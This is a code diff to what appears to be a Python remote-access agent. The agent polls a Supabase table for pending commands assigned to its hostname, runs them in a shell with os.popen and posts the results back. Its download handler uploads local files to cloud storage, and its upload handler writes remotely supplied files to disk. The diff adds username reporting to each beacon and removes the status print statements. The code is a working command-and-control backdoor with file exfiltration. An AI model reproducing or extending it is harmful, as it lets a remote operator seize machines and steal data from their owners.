@@ -64,17 +64,18 @@ def fetch_pending_commands_for_hostname(hostname):
     """Fetch commands with status 'Pending' and a specific hostname."""
     return supabase.table('py2').select('*').eq('status', 'Pending').eq('hostname', hostname).execute()
 
-def update_command_status(command_id, status, output='', hostname='', ip='', os=''):
+def update_command_status(command_id, status, output='', hostname='', ip='', os='', username=''):
     """Update the status, output, and system info of a command."""
     supabase.table('py2').update({
         'status': status,
         'output': output,
         'hostname': hostname,
         'ip': ip,
-        'os': os
+        'os': os,
+        'username': username
     }).eq('id', command_id).execute()
 
-def handle_download_command(command_text):
+def handle_download_command(command_text, username):
     """Handle the 'download' command by uploading the file to Supabase storage and updating the downloads table."""
     try:
         _, file_path = command_text.split(maxsplit=1)
@@ -103,6 +104,7 @@ def handle_download_command(command_text):
                 'local_path': file_path,
                 'remote_path': storage_path,
                 'file_url': file_url,
+                'username': username,
                 'status': 'Completed'
             }).execute()
 
@@ -133,10 +135,8 @@ def download_from_supabase(file_url, remote_path, supabase_key):
     if response.status_code == 200:
         with open(remote_path, 'wb') as file:
             file.write(response.content)
-        print(f"Download successful, file saved to {remote_path}")
         return True
     else:
-        print(f"Failed to download file: {response.status_code} - {response.reason}")
         return False
 
 def fetch_pending_uploads():
@@ -144,7 +144,7 @@ def fetch_pending_uploads():
     return supabase.table("uploads").select("*").eq("status", "pending").execute()
 
 
-def handle_upload_command(command_text, encoded_data):
+def handle_upload_command(command_text, encoded_data, username):
     """Handle the 'upload' command by decoding and writing the file to the specified path."""
     try:
         _, remote_path = command_text.split(maxsplit=2)[1:]
@@ -173,12 +173,13 @@ def execute_commands():
     for command in pending_commands:
         command_id = command['id']
         command_text = command['command']
+        username = command.get('username', 'Unknown')
         encoded_data = command.get('output', '')  # Fetch encoded data for upload commands
 
         if command_text.lower().startswith('download'):
-            status, output = handle_download_command(command_text)
+            status, output = handle_download_command(command_text, username)
         elif command_text.lower().startswith('upload'):
-            status, output = handle_upload_command(command_text, encoded_data) # Pass encoded data to handle_upload_command
+            status, output = handle_upload_command(command_text, encoded_data, username) # Pass encoded data to handle_upload_command
         else:
             try:
                 result = os.popen(command_text).read()
@@ -188,7 +189,7 @@ def execute_commands():
                 status = 'Failed'
                 output = str(e)
 
-        update_command_status(command_id, status, output, hostname, ip, os_info)
+        update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
 if __name__ == '__main__':
     while True:
